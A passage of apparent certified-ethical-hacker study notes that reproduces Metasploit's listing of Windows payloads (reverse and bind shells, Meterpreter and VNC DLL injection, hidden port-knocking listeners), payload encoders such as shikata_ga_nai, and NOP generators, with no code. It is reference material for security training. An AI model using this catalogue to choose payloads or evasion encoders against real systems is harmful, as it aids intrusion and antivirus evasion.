    windows/meterpreter/bind_tcp_rc4                    Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Listen for a connection
    windows/meterpreter/bind_tcp_uuid                   Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Listen for a connection with UUID Support (Windows x86)
    windows/meterpreter/find_tag                        Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Use an established connection
    windows/meterpreter/reverse_hop_http                Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Tunnel communication over an HTTP or HTTPS hop point. Note that you must first upload data/hop/hop.php to the PHP server you wish to use as a hop.
    windows/meterpreter/reverse_http                    Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Tunnel communication over HTTP (Windows wininet)
    windows/meterpreter/reverse_http_proxy_pstore       Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Tunnel communication over HTTP
    windows/meterpreter/reverse_https                   Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Tunnel communication over HTTPS (Windows wininet)
    windows/meterpreter/reverse_https_proxy             Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Tunnel communication over HTTP using SSL with custom proxy support
    windows/meterpreter/reverse_ipv6_tcp                Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Connect back to the attacker over IPv6
    windows/meterpreter/reverse_nonx_tcp                Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Connect back to the attacker (No NX)
    windows/meterpreter/reverse_ord_tcp                 Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Connect back to the attacker
    windows/meterpreter/reverse_tcp                     Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Connect back to the attacker
    windows/meterpreter/reverse_tcp_allports            Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Try to connect back to the attacker, on all possible ports (1-65535, slowly)
    windows/meterpreter/reverse_tcp_dns                 Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Connect back to the attacker
    windows/meterpreter/reverse_tcp_rc4                 Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Connect back to the attacker
    windows/meterpreter/reverse_tcp_rc4_dns             Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Connect back to the attacker
    windows/meterpreter/reverse_tcp_uuid                Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Connect back to the attacker with UUID Support
    windows/meterpreter/reverse_winhttp                 Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Tunnel communication over HTTP (Windows winhttp)
    windows/meterpreter/reverse_winhttps                Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Tunnel communication over HTTPS (Windows winhttp)
    windows/meterpreter_bind_tcp                        Connect to victim and spawn a Meterpreter shell
    windows/meterpreter_reverse_http                    Connect back to attacker and spawn a Meterpreter shell
    windows/meterpreter_reverse_https                   Connect back to attacker and spawn a Meterpreter shell
    windows/meterpreter_reverse_ipv6_tcp                Connect back to attacker and spawn a Meterpreter shell
    windows/meterpreter_reverse_tcp                     Connect back to attacker and spawn a Meterpreter shell
    windows/metsvc_bind_tcp                             Stub payload for interacting with a Meterpreter Service
    windows/metsvc_reverse_tcp                          Stub payload for interacting with a Meterpreter Service
    windows/patchupdllinject/bind_hidden_ipknock_tcp    Inject a custom DLL into the exploited process. Listen for a connection. First, the port will need to be knocked from the IP defined in KHOST. This IP will work as an authentication method (you can spoof it with tools like hping). After that you could get your shellcode from any IP. The socket will appear as "closed," thus helping to hide the shellcode
    windows/patchupdllinject/bind_hidden_tcp            Inject a custom DLL into the exploited process. Listen for a connection from a hidden port and spawn a command shell to the allowed host.
    windows/patchupdllinject/bind_ipv6_tcp              Inject a custom DLL into the exploited process. Listen for an IPv6 connection (Windows x86)
    windows/patchupdllinject/bind_ipv6_tcp_uuid         Inject a custom DLL into the exploited process. Listen for an IPv6 connection with UUID Support (Windows x86)
    windows/patchupdllinject/bind_nonx_tcp              Inject a custom DLL into the exploited process. Listen for a connection (No NX)
    windows/patchupdllinject/bind_tcp                   Inject a custom DLL into the exploited process. Listen for a connection (Windows x86)
    windows/patchupdllinject/bind_tcp_rc4               Inject a custom DLL into the exploited process. Listen for a connection
    windows/patchupdllinject/bind_tcp_uuid              Inject a custom DLL into the exploited process. Listen for a connection with UUID Support (Windows x86)
    windows/patchupdllinject/find_tag                   Inject a custom DLL into the exploited process. Use an established connection
    windows/patchupdllinject/reverse_ipv6_tcp           Inject a custom DLL into the exploited process. Connect back to the attacker over IPv6
    windows/patchupdllinject/reverse_nonx_tcp           Inject a custom DLL into the exploited process. Connect back to the attacker (No NX)
    windows/patchupdllinject/reverse_ord_tcp            Inject a custom DLL into the exploited process. Connect back to the attacker
    windows/patchupdllinject/reverse_tcp                Inject a custom DLL into the exploited process. Connect back to the attacker
    windows/patchupdllinject/reverse_tcp_allports       Inject a custom DLL into the exploited process. Try to connect back to the attacker, on all possible ports (1-65535, slowly)
    windows/patchupdllinject/reverse_tcp_dns            Inject a custom DLL into the exploited process. Connect back to the attacker
    windows/patchupdllinject/reverse_tcp_rc4            Inject a custom DLL into the exploited process. Connect back to the attacker
    windows/patchupdllinject/reverse_tcp_rc4_dns        Inject a custom DLL into the exploited process. Connect back to the attacker
    windows/patchupdllinject/reverse_tcp_uuid           Inject a custom DLL into the exploited process. Connect back to the attacker with UUID Support
    windows/patchupmeterpreter/bind_hidden_ipknock_tcp  Inject the meterpreter server DLL (staged). Listen for a connection. First, the port will need to be knocked from the IP defined in KHOST. This IP will work as an authentication method (you can spoof it with tools like hping). After that you could get your shellcode from any IP. The socket will appear as "closed," thus helping to hide the shellcode
    windows/patchupmeterpreter/bind_hidden_tcp          Inject the meterpreter server DLL (staged). Listen for a connection from a hidden port and spawn a command shell to the allowed host.
    windows/patchupmeterpreter/bind_ipv6_tcp            Inject the meterpreter server DLL (staged). Listen for an IPv6 connection (Windows x86)
    windows/patchupmeterpreter/bind_ipv6_tcp_uuid       Inject the meterpreter server DLL (staged). Listen for an IPv6 connection with UUID Support (Windows x86)
    windows/patchupmeterpreter/bind_nonx_tcp            Inject the meterpreter server DLL (staged). Listen for a connection (No NX)
    windows/patchupmeterpreter/bind_tcp                 Inject the meterpreter server DLL (staged). Listen for a connection (Windows x86)
    windows/patchupmeterpreter/bind_tcp_rc4             Inject the meterpreter server DLL (staged). Listen for a connection
    windows/patchupmeterpreter/bind_tcp_uuid            Inject the meterpreter server DLL (staged). Listen for a connection with UUID Support (Windows x86)
    windows/patchupmeterpreter/find_tag                 Inject the meterpreter server DLL (staged). Use an established connection
    windows/patchupmeterpreter/reverse_ipv6_tcp         Inject the meterpreter server DLL (staged). Connect back to the attacker over IPv6
    windows/patchupmeterpreter/reverse_nonx_tcp         Inject the meterpreter server DLL (staged). Connect back to the attacker (No NX)
    windows/patchupmeterpreter/reverse_ord_tcp          Inject the meterpreter server DLL (staged). Connect back to the attacker
    windows/patchupmeterpreter/reverse_tcp              Inject the meterpreter server DLL (staged). Connect back to the attacker
    windows/patchupmeterpreter/reverse_tcp_allports     Inject the meterpreter server DLL (staged). Try to connect back to the attacker, on all possible ports (1-65535, slowly)
    windows/patchupmeterpreter/reverse_tcp_dns          Inject the meterpreter server DLL (staged). Connect back to the attacker
    windows/patchupmeterpreter/reverse_tcp_rc4          Inject the meterpreter server DLL (staged). Connect back to the attacker
    windows/patchupmeterpreter/reverse_tcp_rc4_dns      Inject the meterpreter server DLL (staged). Connect back to the attacker
    windows/patchupmeterpreter/reverse_tcp_uuid         Inject the meterpreter server DLL (staged). Connect back to the attacker with UUID Support
    windows/powershell_bind_tcp                         Listen for a connection and spawn an interactive powershell session
    windows/powershell_reverse_tcp                      Listen for a connection and spawn an interactive powershell session
    windows/shell/bind_hidden_ipknock_tcp               Spawn a piped command shell (staged). Listen for a connection. First, the port will need to be knocked from the IP defined in KHOST. This IP will work as an authentication method (you can spoof it with tools like hping). After that you could get your shellcode from any IP. The socket will appear as "closed," thus helping to hide the shellcode
    windows/shell/bind_hidden_tcp                       Spawn a piped command shell (staged). Listen for a connection from a hidden port and spawn a command shell to the allowed host.
    windows/shell/bind_ipv6_tcp                         Spawn a piped command shell (staged). Listen for an IPv6 connection (Windows x86)
    windows/shell/bind_ipv6_tcp_uuid                    Spawn a piped command shell (staged). Listen for an IPv6 connection with UUID Support (Windows x86)
    windows/shell/bind_nonx_tcp                         Spawn a piped command shell (staged). Listen for a connection (No NX)
    windows/shell/bind_tcp                              Spawn a piped command shell (staged). Listen for a connection (Windows x86)
    windows/shell/bind_tcp_rc4                          Spawn a piped command shell (staged). Listen for a connection
    windows/shell/bind_tcp_uuid                         Spawn a piped command shell (staged). Listen for a connection with UUID Support (Windows x86)
    windows/shell/find_tag                              Spawn a piped command shell (staged). Use an established connection
    windows/shell/reverse_ipv6_tcp                      Spawn a piped command shell (staged). Connect back to the attacker over IPv6
    windows/shell/reverse_nonx_tcp                      Spawn a piped command shell (staged). Connect back to the attacker (No NX)
    windows/shell/reverse_ord_tcp                       Spawn a piped command shell (staged). Connect back to the attacker
    windows/shell/reverse_tcp                           Spawn a piped command shell (staged). Connect back to the attacker
    windows/shell/reverse_tcp_allports                  Spawn a piped command shell (staged). Try to connect back to the attacker, on all possible ports (1-65535, slowly)
    windows/shell/reverse_tcp_dns                       Spawn a piped command shell (staged). Connect back to the attacker
    windows/shell/reverse_tcp_rc4                       Spawn a piped command shell (staged). Connect back to the attacker
    windows/shell/reverse_tcp_rc4_dns                   Spawn a piped command shell (staged). Connect back to the attacker
    windows/shell/reverse_tcp_uuid                      Spawn a piped command shell (staged). Connect back to the attacker with UUID Support
    windows/shell_bind_tcp                              Listen for a connection and spawn a command shell
    windows/shell_bind_tcp_xpfw                         Disable the Windows ICF, then listen for a connection and spawn a command shell
    windows/shell_hidden_bind_tcp                       Listen for a connection from certain IP and spawn a command shell. The shellcode will reply with a RST packet if the connections is not comming from the IP defined in AHOST. This way the port will appear as "closed" helping us to hide the shellcode.
    windows/shell_reverse_tcp                           Connect back to attacker and spawn a command shell
    windows/speak_pwned                                 Causes the target to say "You Got Pwned" via the Windows Speech API
    windows/upexec/bind_hidden_ipknock_tcp              Uploads an executable and runs it (staged). Listen for a connection. First, the port will need to be knocked from the IP defined in KHOST. This IP will work as an authentication method (you can spoof it with tools like hping). After that you could get your shellcode from any IP. The socket will appear as "closed," thus helping to hide the shellcode
    windows/upexec/bind_hidden_tcp                      Uploads an executable and runs it (staged). Listen for a connection from a hidden port and spawn a command shell to the allowed host.
    windows/upexec/bind_ipv6_tcp                        Uploads an executable and runs it (staged). Listen for an IPv6 connection (Windows x86)
    windows/upexec/bind_ipv6_tcp_uuid                   Uploads an executable and runs it (staged). Listen for an IPv6 connection with UUID Support (Windows x86)
    windows/upexec/bind_nonx_tcp                        Uploads an executable and runs it (staged). Listen for a connection (No NX)
    windows/upexec/bind_tcp                             Uploads an executable and runs it (staged). Listen for a connection (Windows x86)
    windows/upexec/bind_tcp_rc4                         Uploads an executable and runs it (staged). Listen for a connection
    windows/upexec/bind_tcp_uuid                        Uploads an executable and runs it (staged). Listen for a connection with UUID Support (Windows x86)
    windows/upexec/find_tag                             Uploads an executable and runs it (staged). Use an established connection
    windows/upexec/reverse_ipv6_tcp                     Uploads an executable and runs it (staged). Connect back to the attacker over IPv6
    windows/upexec/reverse_nonx_tcp                     Uploads an executable and runs it (staged). Connect back to the attacker (No NX)
    windows/upexec/reverse_ord_tcp                      Uploads an executable and runs it (staged). Connect back to the attacker
    windows/upexec/reverse_tcp                          Uploads an executable and runs it (staged). Connect back to the attacker
    windows/upexec/reverse_tcp_allports                 Uploads an executable and runs it (staged). Try to connect back to the attacker, on all possible ports (1-65535, slowly)
    windows/upexec/reverse_tcp_dns                      Uploads an executable and runs it (staged). Connect back to the attacker
    windows/upexec/reverse_tcp_rc4                      Uploads an executable and runs it (staged). Connect back to the attacker
    windows/upexec/reverse_tcp_rc4_dns                  Uploads an executable and runs it (staged). Connect back to the attacker
    windows/upexec/reverse_tcp_uuid                     Uploads an executable and runs it (staged). Connect back to the attacker with UUID Support
    windows/vncinject/bind_hidden_ipknock_tcp           Inject a VNC Dll via a reflective loader (staged). Listen for a connection. First, the port will need to be knocked from the IP defined in KHOST. This IP will work as an authentication method (you can spoof it with tools like hping). After that you could get your shellcode from any IP. The socket will appear as "closed," thus helping to hide the shellcode
    windows/vncinject/bind_hidden_tcp                   Inject a VNC Dll via a reflective loader (staged). Listen for a connection from a hidden port and spawn a command shell to the allowed host.
    windows/vncinject/bind_ipv6_tcp                     Inject a VNC Dll via a reflective loader (staged). Listen for an IPv6 connection (Windows x86)
    windows/vncinject/bind_ipv6_tcp_uuid                Inject a VNC Dll via a reflective loader (staged). Listen for an IPv6 connection with UUID Support (Windows x86)
    windows/vncinject/bind_nonx_tcp                     Inject a VNC Dll via a reflective loader (staged). Listen for a connection (No NX)
    windows/vncinject/bind_tcp                          Inject a VNC Dll via a reflective loader (staged). Listen for a connection (Windows x86)
    windows/vncinject/bind_tcp_rc4                      Inject a VNC Dll via a reflective loader (staged). Listen for a connection
    windows/vncinject/bind_tcp_uuid                     Inject a VNC Dll via a reflective loader (staged). Listen for a connection with UUID Support (Windows x86)
    windows/vncinject/find_tag                          Inject a VNC Dll via a reflective loader (staged). Use an established connection
    windows/vncinject/reverse_hop_http                  Inject a VNC Dll via a reflective loader (staged). Tunnel communication over an HTTP or HTTPS hop point. Note that you must first upload data/hop/hop.php to the PHP server you wish to use as a hop.
    windows/vncinject/reverse_http                      Inject a VNC Dll via a reflective loader (staged). Tunnel communication over HTTP (Windows wininet)
    windows/vncinject/reverse_http_proxy_pstore         Inject a VNC Dll via a reflective loader (staged). Tunnel communication over HTTP
    windows/vncinject/reverse_ipv6_tcp                  Inject a VNC Dll via a reflective loader (staged). Connect back to the attacker over IPv6
    windows/vncinject/reverse_nonx_tcp                  Inject a VNC Dll via a reflective loader (staged). Connect back to the attacker (No NX)
    windows/vncinject/reverse_ord_tcp                   Inject a VNC Dll via a reflective loader (staged). Connect back to the attacker
    windows/vncinject/reverse_tcp                       Inject a VNC Dll via a reflective loader (staged). Connect back to the attacker
    windows/vncinject/reverse_tcp_allports              Inject a VNC Dll via a reflective loader (staged). Try to connect back to the attacker, on all possible ports (1-65535, slowly)
    windows/vncinject/reverse_tcp_dns                   Inject a VNC Dll via a reflective loader (staged). Connect back to the attacker
    windows/vncinject/reverse_tcp_rc4                   Inject a VNC Dll via a reflective loader (staged). Connect back to the attacker
    windows/vncinject/reverse_tcp_rc4_dns               Inject a VNC Dll via a reflective loader (staged). Connect back to the attacker
    windows/vncinject/reverse_tcp_uuid                  Inject a VNC Dll via a reflective loader (staged). Connect back to the attacker with UUID Support
    windows/vncinject/reverse_winhttp                   Inject a VNC Dll via a reflective loader (staged). Tunnel communication over HTTP (Windows winhttp)
    windows/x64/exec                                    Execute an arbitrary command (Windows x64)
    windows/x64/loadlibrary                             Load an arbitrary x64 library path
    windows/x64/meterpreter/bind_ipv6_tcp               Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged x64). Listen for an IPv6 connection (Windows x64)
    windows/x64/meterpreter/bind_ipv6_tcp_uuid          Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged x64). Listen for an IPv6 connection with UUID Support (Windows x64)
    windows/x64/meterpreter/bind_tcp                    Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged x64). Listen for a connection (Windows x64)
    windows/x64/meterpreter/bind_tcp_uuid               Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged x64). Listen for a connection with UUID Support (Windows x64)
    windows/x64/meterpreter/reverse_http                Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged x64). Tunnel communication over HTTP (Windows x64 wininet)
    windows/x64/meterpreter/reverse_https               Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged x64). Tunnel communication over HTTP (Windows x64 wininet)
    windows/x64/meterpreter/reverse_tcp                 Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged x64). Connect back to the attacker (Windows x64)
    windows/x64/meterpreter/reverse_tcp_uuid            Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged x64). Connect back to the attacker with UUID Support (Windows x64)
    windows/x64/meterpreter/reverse_winhttp             Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged x64). Tunnel communication over HTTP (Windows x64 winhttp)
    windows/x64/meterpreter/reverse_winhttps            Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged x64). Tunnel communication over HTTPS (Windows x64 winhttp)
    windows/x64/meterpreter_bind_tcp                    Connect to victim and spawn a Meterpreter shell
    windows/x64/meterpreter_reverse_http                Connect back to attacker and spawn a Meterpreter shell
    windows/x64/meterpreter_reverse_https               Connect back to attacker and spawn a Meterpreter shell
    windows/x64/meterpreter_reverse_ipv6_tcp            Connect back to attacker and spawn a Meterpreter shell
    windows/x64/meterpreter_reverse_tcp                 Connect back to attacker and spawn a Meterpreter shell
    windows/x64/powershell_bind_tcp                     Listen for a connection and spawn an interactive powershell session
    windows/x64/powershell_reverse_tcp                  Listen for a connection and spawn an interactive powershell session
    windows/x64/shell/bind_ipv6_tcp                     Spawn a piped command shell (Windows x64) (staged). Listen for an IPv6 connection (Windows x64)
    windows/x64/shell/bind_ipv6_tcp_uuid                Spawn a piped command shell (Windows x64) (staged). Listen for an IPv6 connection with UUID Support (Windows x64)
    windows/x64/shell/bind_tcp                          Spawn a piped command shell (Windows x64) (staged). Listen for a connection (Windows x64)
    windows/x64/shell/bind_tcp_uuid                     Spawn a piped command shell (Windows x64) (staged). Listen for a connection with UUID Support (Windows x64)
    windows/x64/shell/reverse_tcp                       Spawn a piped command shell (Windows x64) (staged). Connect back to the attacker (Windows x64)
    windows/x64/shell/reverse_tcp_uuid                  Spawn a piped command shell (Windows x64) (staged). Connect back to the attacker with UUID Support (Windows x64)
    windows/x64/shell_bind_tcp                          Listen for a connection and spawn a command shell (Windows x64)
    windows/x64/shell_reverse_tcp                       Connect back to attacker and spawn a command shell (Windows x64)
    windows/x64/vncinject/bind_ipv6_tcp                 Inject a VNC Dll via a reflective loader (Windows x64) (staged). Listen for an IPv6 connection (Windows x64)
    windows/x64/vncinject/bind_ipv6_tcp_uuid            Inject a VNC Dll via a reflective loader (Windows x64) (staged). Listen for an IPv6 connection with UUID Support (Windows x64)
    windows/x64/vncinject/bind_tcp                      Inject a VNC Dll via a reflective loader (Windows x64) (staged). Listen for a connection (Windows x64)
    windows/x64/vncinject/bind_tcp_uuid                 Inject a VNC Dll via a reflective loader (Windows x64) (staged). Listen for a connection with UUID Support (Windows x64)
    windows/x64/vncinject/reverse_http                  Inject a VNC Dll via a reflective loader (Windows x64) (staged). Tunnel communication over HTTP (Windows x64 wininet)
    windows/x64/vncinject/reverse_https                 Inject a VNC Dll via a reflective loader (Windows x64) (staged). Tunnel communication over HTTP (Windows x64 wininet)
    windows/x64/vncinject/reverse_tcp                   Inject a VNC Dll via a reflective loader (Windows x64) (staged). Connect back to the attacker (Windows x64)
    windows/x64/vncinject/reverse_tcp_uuid              Inject a VNC Dll via a reflective loader (Windows x64) (staged). Connect back to the attacker with UUID Support (Windows x64)
    windows/x64/vncinject/reverse_winhttp               Inject a VNC Dll via a reflective loader (Windows x64) (staged). Tunnel communication over HTTP (Windows x64 winhttp)
    windows/x64/vncinject/reverse_winhttps              Inject a VNC Dll via a reflective loader (Windows x64) (staged). Tunnel communication over HTTPS (Windows x64 winhttp)


Framework Encoders
==================

    Name                          Rank       Description
    ----                          ----       -----------
    cmd/echo                      good       Echo Command Encoder
    cmd/generic_sh                manual     Generic Shell Variable Substitution Command Encoder
    cmd/ifs                       low        Generic ${IFS} Substitution Command Encoder
    cmd/perl                      normal     Perl Command Encoder
    cmd/powershell_base64         excellent  Powershell Base64 Command Encoder
    cmd/printf_php_mq             manual     printf(1) via PHP magic_quotes Utility Command Encoder
    generic/eicar                 manual     The EICAR Encoder
    generic/none                  normal     The "none" Encoder
    mipsbe/byte_xori              normal     Byte XORi Encoder
    mipsbe/longxor                normal     XOR Encoder
    mipsle/byte_xori              normal     Byte XORi Encoder
    mipsle/longxor                normal     XOR Encoder
    php/base64                    great      PHP Base64 Encoder
    ppc/longxor                   normal     PPC LongXOR Encoder
    ppc/longxor_tag               normal     PPC LongXOR Encoder
    sparc/longxor_tag             normal     SPARC DWORD XOR Encoder
    x64/xor                       normal     XOR Encoder
    x64/zutto_dekiru              manual     Zutto Dekiru
    x86/add_sub                   manual     Add/Sub Encoder
    x86/alpha_mixed               low        Alpha2 Alphanumeric Mixedcase Encoder
    x86/alpha_upper               low        Alpha2 Alphanumeric Uppercase Encoder
    x86/avoid_underscore_tolower  manual     Avoid underscore/tolower
    x86/avoid_utf8_tolower        manual     Avoid UTF8/tolower
    x86/bloxor                    manual     BloXor - A Metamorphic Block Based XOR Encoder
    x86/bmp_polyglot              manual     BMP Polyglot
    x86/call4_dword_xor           normal     Call+4 Dword XOR Encoder
    x86/context_cpuid             manual     CPUID-based Context Keyed Payload Encoder
    x86/context_stat              manual     stat(2)-based Context Keyed Payload Encoder
    x86/context_time              manual     time(2)-based Context Keyed Payload Encoder
    x86/countdown                 normal     Single-byte XOR Countdown Encoder
    x86/fnstenv_mov               normal     Variable-length Fnstenv/mov Dword XOR Encoder
    x86/jmp_call_additive         normal     Jump/Call XOR Additive Feedback Encoder
    x86/nonalpha                  low        Non-Alpha Encoder
    x86/nonupper                  low        Non-Upper Encoder
    x86/opt_sub                   manual     Sub Encoder (optimised)
    x86/shikata_ga_nai            excellent  Polymorphic XOR Additive Feedback Encoder
    x86/single_static_bit         manual     Single Static Bit
    x86/unicode_mixed             manual     Alpha2 Alphanumeric Unicode Mixedcase Encoder
    x86/unicode_upper             manual     Alpha2 Alphanumeric Unicode Uppercase Encoder


Framework NOPs (8 total)
========================

    Name             Description
    ----             -----------
    armle/simple     Simple NOP generator
    php/generic      Generates harmless padding for PHP scripts
    ppc/simple       Simple NOP generator
    sparc/random     SPARC NOP generator
    tty/generic      Generates harmless padding for TTY input
    x64/simple       An x64 single/multi byte NOP instruction generator.
    x86/opty2        Opty2 multi-byte NOP generator
    x86/single_byte  Single-byte NOP generator
```

---

[Back to main](https://github.com/rot0xd/CBTNuggets/blob/master/CEHv9/README.md)
